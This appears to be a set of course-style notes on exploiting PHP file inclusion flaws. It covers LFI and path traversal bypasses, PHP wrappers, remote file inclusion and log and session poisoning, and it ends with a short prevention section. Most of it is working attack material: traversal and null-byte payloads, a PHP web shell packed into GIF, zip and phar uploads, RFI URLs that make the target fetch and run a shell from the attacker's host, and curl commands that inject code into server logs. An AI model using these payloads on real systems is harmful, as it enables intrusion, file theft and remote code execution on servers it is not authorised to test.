
# Introduction to File Inclusions

**Local File Inclusion (LFI)** occurs when a web application allows users to control file paths, potentially leading to the inclusion of unintended files. This can expose sensitive data or even allow attackers to execute arbitrary code on the server.

### Risks of LFI:
- **Source Code Disclosure**: Attackers can view and analyze the application’s source code for other vulnerabilities.
- **Sensitive Data Exposure**: LFI can expose credentials, configuration files, or other sensitive information.
- **Remote Code Execution**: In some cases, LFI can lead to remote code execution, allowing attackers to fully compromise the server.

### Example of LFI in PHP
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```
- **Vulnerability:** The `include()` function loads files based on user-controlled input, making it possible for an attacker to include files from the server (e.g., `/etc/passwd`).

### Key Functions in LFI:
| Function                    | Read Content | Execute | Remote URL |
|-----------------------------|--------------|---------|------------|
| `include()`, `require()`     | ✅            | ✅       | ✅          |
| `fs.readFile()`, `sendFile()`| ✅            | ❌       | ❌          |
| `@Html.Partial()`, `Response.WriteFile()` | ✅            | ❌       | ❌          |

---

# Local File Inclusion (LFI)

## What is LFI?
- LFI occurs when web applications allow user input to specify file paths, potentially leading to the inclusion of unintended files (e.g., `/etc/passwd`), exposing sensitive data or enabling code execution.

## LFI Exploitation Examples

### 1. **Basic LFI**  
URL: `http://<SERVER_IP>:<PORT>/index.php?language=es.php`  
- **Vulnerability**: The web app includes files based on user input, allowing attackers to read sensitive files by changing the parameter, e.g., `/etc/passwd`.

### 2. **Path Traversal**  
- **Bypassing restrictions**: Use `../../../../` to traverse to the root directory and access files like `/etc/passwd`.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd`

### 3. **Filename Prefix**  
- **Bypass with `/`**: When a prefix like `lang_` is added, prepend `/` to path traversal to bypass the prefix.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd`

### 4. **Appended Extensions**  
- **File extension issues**: When `.php` is appended to the input, use techniques like `%00` (null byte) to bypass the extension filter and access files.  
Example: `http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00`

### 5. **Second-Order LFI Attacks**  
- **Poisoning input**: Attackers can exploit LFI through indirect inputs, like user profiles, that are later used to load files (e.g., `/profile/$username/avatar.png`).  
- **Exploit**: Poison a value (like username) to control what file is loaded later.

---

# Basic Bypasses 

### 1. Non-Recursive Path Traversal Filters
- **Issue**: Filters remove `../` substrings once but do not recursively check the output string.
- **Bypass**:
  - Use payloads like `....//`, `..././`, or `....\/`.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
    ```

### 2. Encoding
- **Issue**: Filters may block `.` and `/` characters.
- **Bypass**:
  - URL encode payloads (e.g., `../` -> `%2e%2e%2f`).
  - Double encoding may bypass additional filters.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
    ```

### 3. Approved Paths
- **Issue**: Regex used to restrict files to specific directories (e.g., `./languages/`).
- **Bypass**:
  - Start payload with the approved path and use `../` traversal.
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
    ```

### 4. Appended Extensions
- **Issue**: Application appends extensions like `.php` to input strings.
- **Bypass**:
  - Restricted to `.php` files in modern PHP versions.
  - Explore file content (e.g., source code).

### 5. Path Truncation (PHP < 5.3/5.4)
- **Issue**: PHP truncates strings beyond 4096 characters and removes trailing slashes/single dots.
- **Bypass**:
  - Create long paths where `.php` is truncated.
  - Automate string creation:
    ```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
    ```

### 6. Null Byte Injection (PHP < 5.5)
- **Issue**: Null byte `%00` terminates the string, ignoring appended extensions.
- **Bypass**:
  - Payload: `/etc/passwd%00`
  - Example:
    ```url
    http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00
    ```

---
# PHP Filters 

### Overview
- **PHP Wrappers**: Allow access to I/O streams and extend Local File Inclusion (LFI) exploitation.
- **Use Cases**: Can read PHP source code, gain remote code execution, and assist in attacks like XXE.

### Input Filters
- **PHP Filters**: A type of PHP Wrapper that filters input streams via `php://filter/`.
- **Parameters**:
  - `resource`: Specifies the stream (e.g., a file) to filter.
  - `read`: Applies the specified filter (e.g., `convert.base64-encode`).
- **Types of Filters**:
  - String Filters
  - Conversion Filters (e.g., `convert.base64-encode`)
  - Compression Filters
  - Encryption Filters

### Fuzzing for PHP Files
- Use tools like `ffuf` or `gobuster` to identify PHP pages:
  ```bash
  ffuf -w /path/to/list.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
  ```
- **Tip**: Scan for all response codes (200, 301, 302, 403) to find potential sources.

### Source Code Disclosure
1. Identify a PHP file, e.g., `config.php`.
2. Include the file using LFI with a base64 filter:
   ```url
   php://filter/read=convert.base64-encode/resource=config
   ```
   Access:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
   ```
3. Base64 decode the result to retrieve the source code:
   ```bash
   echo 'Base64_String_Here' | base64 -d
   ```
- **Tip**: Ensure the entire base64 string is copied for full decoding.

---



# PHP Wrappers

## File Inclusion Vulnerabilities
- File Inclusion vulnerabilities occur when an application includes files specified by the user without proper validation.
- These vulnerabilities can:
  - Disclose sensitive files.
  - Allow attackers to execute malicious code or commands.
- They are commonly found in misconfigured servers or poorly sanitized parameters.

PHP Wrappers extend the functionality of PHP streams, allowing data to be treated like a file. They can be exploited in Local File Inclusion (LFI) vulnerabilities to execute code or commands remotely.

### 1. **Data Wrapper**
- **Purpose**: Includes external data, including PHP code.
- **Requirement**: `allow_url_include = On` must be enabled in `php.ini`. This is **not enabled by default** but is sometimes used for compatibility with web applications like certain WordPress plugins.
- **How It Works**:
  - Encode PHP code (e.g., a web shell) in Base64 format.
  - Use `data://text/plain;base64,` to decode and execute the PHP code.
  - Example web shell:
    ```php
    <?php system($_GET["cmd"]); ?>
    ```
  - Encoded and included via:
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_STRING>&cmd=<COMMAND>
    ```
  - Example command: `&cmd=id` (to display user and group information).



### 2. **Input Wrapper**
- **Purpose**: Accepts external input via POST requests to execute PHP code.
- **Requirement**: `allow_url_include = On` must also be enabled.
- **How It Works**:
  - PHP code is sent in the POST data.
  - Example payload:
    ```
    POST: <?php system($_GET["cmd"]); ?>
    GET: ?cmd=id
    ```
  - Useful for situations where GET parameters are restricted.
- **Notes**:
  - If the vulnerable function only accepts POST requests, the command can be hardcoded into the PHP payload:
    ```php
    <?php system('id'); ?>
    ```


### 3. **Expect Wrapper**
- **Purpose**: Executes system commands directly via URL streams.
- **Requirement**: The `expect` extension must be installed and enabled on the server.
- **How It Works**:
  - The `expect://` stream wrapper directly executes system commands.
  - Example command:
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=expect://id
    ```
  - Result: Outputs information such as user ID, group ID, and group memberships.

- **Checking for Installation**:
  - Use LFI with a configuration file (e.g., `/etc/php/<VERSION>/apache2/php.ini`) to check for `extension=expect`.
  - Example:
    ```bash
    $ echo '<BASE64_ENCODED_STRING>' | base64 -d | grep expect
    ```

## Key Points to Secure PHP Applications
- **Disable `allow_url_include`**: Set it to `Off` in `php.ini`.
- **Avoid Installing Unnecessary Extensions**: Do not install or enable modules like `expect` unless required.
- **Limit File Inclusion Paths**: Use `open_basedir` to restrict PHP scripts to specific directories.
- **Validate User Inputs**: Implement proper input validation and sanitization to prevent arbitrary file inclusion.


---



# Remote File Inclusion (RFI)

## Overview
Remote File Inclusion (RFI) vulnerabilities occur when a web application's functions allow the inclusion of remote files by specifying a remote URL. Exploiting RFI can enable attackers to:
1. **Enumerate local-only ports and web applications** (by leveraging SSRF techniques).
2. **Gain remote code execution** by including and executing a malicious script hosted on the attacker's machine.

## Local vs. Remote File Inclusion (LFI vs. RFI)
- RFI includes **remote files via URLs** (e.g., `http://`), while LFI includes **local files**.
- **Key Differences**:
  1. An RFI vulnerability inherently includes LFI functionality since remote file inclusion implies local inclusion.
  2. An LFI may not allow RFI due to:
     - Function restrictions (e.g., no remote URL support).
     - Partial control over file paths (e.g., fixed `http://`).
     - Server configurations disabling remote file inclusion (e.g., `allow_url_include` disabled by default in PHP).


## Verifying RFI Vulnerabilities
### 1. Check Configuration
In languages like PHP, RFI depends on server configurations:
- The `allow_url_include` setting must be enabled:
  ```bash
  $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...' | base64 -d | grep allow_url_include
  allow_url_include = On
  ```

### 2. Test Inclusion
- **Step 1**: Test with a local URL (e.g., `http://127.0.0.1:80/index.php`) to confirm the page allows URL inclusion.
- **Step 2**: Check if the page executes the included file's content (e.g., runs PHP code instead of displaying it as text).

## Exploiting RFI for Remote Code Execution
To exploit RFI for code execution, attackers typically:
1. Create a **malicious script** in the web application's language.
   - Example: A PHP shell script:
     ```php
     <?php system($_GET["cmd"]); ?>
     ```
   - This allows execution of system commands by passing them as parameters.

2. **Host the script** to make it accessible remotely:
   - **HTTP**:
     Use Python's HTTP server to host the script:
     ```bash
     $ sudo python3 -m http.server <LISTENING_PORT>
     ```
   - **FTP**:
     Use Python's FTP server:
     ```bash
     $ sudo python -m pyftpdlib -p 21
     ```
   - **SMB**:
     Use Impacket for SMB hosting (ideal for Windows servers):
     ```bash
     $ impacket-smbserver -smb2support share $(pwd)
     ```

3. **Trigger inclusion through the vulnerable web application**:
   - HTTP Example:
     ```
     http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
     ```
   - FTP Example:
     ```
     http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
     ```
   - SMB Example (Windows UNC Path): SMB doesnt needthe allow_url_include setting to be enabled for RFI exploitation
     ```
     http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
     ```

## Additional Notes
- **Recursive Inclusion**: Including the vulnerable page itself (e.g., `index.php`) could cause a loop and lead to a Denial of Service (DoS).
- **Server-side Request Forgery (SSRF)**:
  - RFI vulnerabilities can double as SSRF vectors, enabling attackers to interact with internal services (e.g., accessing applications on `localhost` or other internal ports).
- **Default Settings**:
  - RFI is often disabled in modern configurations for security reasons (e.g., `allow_url_include` set to `Off` by default in PHP).
  - SMB exploitation may require the attacker to be on the same network if the server restricts remote access.

---

# Local File Inclusion (LFI) and File Uploads

## Overview
File upload functionalities are common in modern web applications, enabling users to upload personal data. Attackers can exploit file upload forms in combination with Local File Inclusion (LFI) vulnerabilities to achieve **Remote Code Execution (RCE)**.

### Key Idea
- The file upload functionality doesn't need to be vulnerable—merely allowing file uploads is sufficient.
- Code Execution occurs when the uploaded file is included and executed by the LFI vulnerability.


## Image Upload Exploitation

### Crafting a Malicious Image
- Create an image file with allowed file extensions (e.g., `.gif`) containing malicious code.
- Include **magic bytes** (e.g., `GIF8`) at the file's start to bypass content-type validation:
  ```bash
  $ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
  ```

### Uploading the Image
- Upload the malicious image (e.g., via profile avatar upload):
  ```
  http://<SERVER_IP>:<PORT>/settings.php
  ```

### Identifying the Uploaded File Path
- Inspect the uploaded file's path from its URL or HTML source:
  ```html
  <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
  ```

### Triggering the LFI Vulnerability
- Include the uploaded file via the vulnerable function to execute the embedded PHP code:
  ```
  http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
  ```

### Note
- Use `../` if the vulnerable function prefixes directories before input (e.g., `../../profile_images/shell.gif`).


## Alternative Techniques

### Zip Upload
#### Overview
The **zip wrapper** can be used to execute PHP code embedded within a zip archive.

#### Steps:
1. Create a malicious PHP file and compress it into a zip archive:
   ```bash
   $ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
   ```
2. Upload the archive.
3. Include the file using the `zip://` wrapper:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
   ```

#### Note
- Zip archives may be blocked by content-type validation unless allowed by the upload functionality.


### Phar Upload
#### Overview
The **phar wrapper** can execute PHP code from a phar file.

#### Steps:
1. Create a PHP script to generate a phar archive:
   ```php
   <?php
   $phar = new Phar('shell.phar');
   $phar->startBuffering();
   $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
   $phar->setStub('<?php __HALT_COMPILER(); ?>');
   $phar->stopBuffering();
   ```
2. Compile it and rename it with an image extension:
   ```bash
   $ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
   ```
3. Upload the phar file.
4. Include it using the `phar://` wrapper:
   ```
   http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
   ```

---


# Log Poisoning Techniques

## 1. **Log Poisoning**
- **Concept**: Inject PHP code into log files that the application logs HTTP headers into, such as User-Agent. The PHP code will execute when the log file is included through a Local File Inclusion (LFI) vulnerability.
- **Requirements**:
  - The PHP application must allow LFI.
  - Must have read access to log files.
- **Command Example (via cURL)**:
  ```bash
  curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
  ```
- **Execution Command (to execute poisoned log file)**:
  ```url
  http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
  ```


## 2. **PHP Session Poisoning**
- **Objective**: Exploit PHP session files (`PHPSESSID`) to execute malicious PHP code stored in the session file.
- **Steps**:
  1. Retrieve your `PHPSESSID` cookie value.
     - Example value: `nhhv8i0o6ua4g88bkdl9u1fdsd`.
  2. Access the session file using LFI. Example:
     ```url
     http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
     ```
  3. Inject a PHP web shell into the session file using a URL-encoded payload:
     ```url
     http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
     ```
  4. Re-include the session file with a `cmd` parameter for execution:
     ```url
     http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
     ```
- **Note**: Each session file inclusion overwrites the file. Use the poisoned web shell to write a permanent shell or send a reverse shell for easier interaction.



## 3. **Server Log Poisoning**
- **Applicable Logs**:
  - Apache (`/var/log/apache2/`)
  - Nginx (`/var/log/nginx/`)
  - Other logs, e.g., `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log`.
- **Steps**:
  1. Modify `User-Agent` with a PHP web shell using Burp Suite or cURL.
     - Example using Burp Suite: 
       Modify `User-Agent` header in the HTTP request to:
       ```php
       <?php system($_GET['cmd']); ?>
       ```
     - Example using cURL:
       ```bash
       curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
       ```
  2. Include the log file with LFI to execute the code:
     ```url
     http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
     ```
  3. Use the `&cmd=` parameter to pass commands (e.g., `&cmd=id`).


## 4. **/proc File Poisoning**
- **Files to Target**:
  - `/proc/self/environ`: Contains environment variables.
  - `/proc/self/fd/N`: File descriptors for process `N`.
- **Concept**: Poison readable `/proc` files with PHP code if access to logs is restricted. Include them using LFI for code execution.


## General Notes:
- **Other Services to Target**:
  - SSH Logs: Inject PHP code as a username during login attempts.
  - FTP Logs: Use PHP code as a username in FTP sessions.
  - Mail Logs: Send an email containing PHP code.
- **Tip**: Ensure read access to logs or `/proc` files before attempting these methods. Use fuzzing tools to locate files if needed.
- **Fuzz Example**: Use an LFI Wordlist to find log file locations.


---

# Automated Scanning for LFI Vulnerabilities

## **Why Manual Exploitation Matters**
- It is crucial to understand and craft custom payloads for exploiting file inclusion vulnerabilities.
- Custom payloads can bypass WAFs/firewalls or adapt to specific configurations.
- Automated tools can save time in trivial cases but may not catch advanced scenarios.

## **Fuzzing Parameters**
- **Why?** 
  Exposed parameters (e.g., GET/POST) may not be tied to HTML forms and are often less secure.

- **Example Command for Fuzzing GET Parameters**:
  ```bash
  ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
  ```

- **Tips**: Use specific wordlists tailored for LFI vulnerabilities.

## **LFI Wordlists**
- **Why?**
  To test for common LFI payloads quickly using predefined wordlists.

- **Popular Wordlist**: `LFI-Jhaddix.txt`.
- **Example Command**:
  ```bash
  ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
  ```
- **Next Steps**: Test identified payloads manually to confirm they show the included file’s content.


## **Fuzzing Server Files**
### Server Webroot Path
- **Why?**
  To locate important files like uploads or understand server structure.

- **Example Command**:
  ```bash
  ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
  ```


### Server Logs/Configuration Files
- **Why?**
  To locate log files for log poisoning or find webroot paths in configuration files.

- **Example Command**:
  ```bash
  ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
  ```

- **Manual Testing Command** (Example for reading a configuration file):
  ```bash
  curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
  ```

## **Common Tools for LFI**
- **Popular Tools**:
  - LFISuite
  - LFiFreak
  - liffy
- **Limitations**:
  - Many tools are outdated and rely on Python 2.
  - Manual methods often yield better results in complex scenarios.

---
# File inclusion Prevention

File inclusion vulnerabilities, including Local File Inclusion (LFI) and Remote File Inclusion (RFI), occur when web applications improperly handle user-supplied input in file inclusion functions, potentially allowing attackers to execute arbitrary code or access sensitive files.

**Prevention Strategies:**

1. **Avoid User-Controlled Inputs in File Inclusion Functions:**
   Design your application to prevent user input from directly influencing file inclusion functions. Where unavoidable, implement strict validation to ensure inputs correspond to intended files.

2. **Implement a Whitelist of Allowed Files:**
   Use a whitelist to map user inputs to specific files, ensuring only predefined files are included. This can be achieved through methods like database tables, case-match scripts, or static mappings.

3. **Sanitize User Inputs to Prevent Directory Traversal:**
   Remove or neutralize directory traversal sequences (e.g., `../`) from user inputs to prevent access to unintended directories. For example, recursively strip `../` substrings:

   ```php
   while (substr_count($input, '../', 0)) {
       $input = str_replace('../', '', $input);
   }
   ```


4. **Configure the Web Server Securely:**
   - Disable the inclusion of remote files by setting `allow_url_fopen` and `allow_url_include` to Off in PHP.
   - Restrict the application's file access to the web root directory using configurations like `open_basedir`.
   - Disable potentially dangerous modules, such as `mod_userdir`.

5. **Utilize a Web Application Firewall (WAF):**
   Deploy a WAF, like ModSecurity, to filter and monitor HTTP requests, helping to detect and block malicious activities. Configure the WAF in permissive mode initially to fine-tune rules and minimize false positives.

**Continuous Hardening:**

Hardening is an ongoing process. Regularly update systems and applications, monitor logs for unusual activities, and test defenses, especially after security advisories or zero-day vulnerabilities are announced.

By implementing these measures, you can significantly reduce the risk of file inclusion vulnerabilities and enhance the security posture of your web applications.
